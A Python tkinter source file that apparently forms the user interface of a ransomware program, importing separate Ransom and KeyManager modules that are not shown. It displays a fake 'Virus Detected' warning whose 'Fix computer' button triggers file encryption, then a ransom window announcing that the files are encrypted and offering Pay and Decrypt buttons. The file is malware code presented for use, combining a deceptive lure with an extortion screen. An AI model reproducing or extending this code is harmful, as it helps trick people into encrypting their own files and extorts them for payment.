from tkinter import *
from ransom import Ransom
from KeyManager import KeyManager


#sudo apt-get install python3-tk



class GUI:


    def __init__(self):
        self.window = None
        self.keyManager = KeyManager()
        self.ransom = Ransom()

        if(True):
            self.loadYouHaveVirus()
        else:
            self.loadEncrypted()




    def pay(self):
        self.keyManager.pay()

    def decrypt(self):
        print('You have been')
        self.ransom.decrypt()

    def encrypt(self):
        print('Encrypted')
        self.ransom.encrypt()
        self.window.destroy()
        self.loadEncrypted()



    def loadEncrypted(self):
        self.window = Tk()

        self.window.title("Welcome to IGonnaMakeYourCry")
        self.window.geometry('350x200')

        lbl = Label(self.window, text="Ooops, your files have been encrypted! :(")
        lbl.grid(column=0, row=0)

        btn = Button(self.window, text="Pay", command=self.pay)
        btn.grid(column=0, row=1)

        btn = Button(self.window, text="Decrypt", command=self.decrypt)
        btn.grid(column=1, row=1)

        self.window.mainloop()


    def loadYouHaveVirus(self):
        self.window = Tk()

        self.window.title("Virus Detected")
        self.window.geometry('350x200')

        lbl = Label(self.window, text="Ooops, your computer is infected. Press button to fix.")
        lbl.grid(column=0, row=0)

        btn = Button(self.window, text="Fix computer", command=self.encrypt)
        btn.grid(column=0, row=1)

        self.window.mainloop()


gui = GUI()
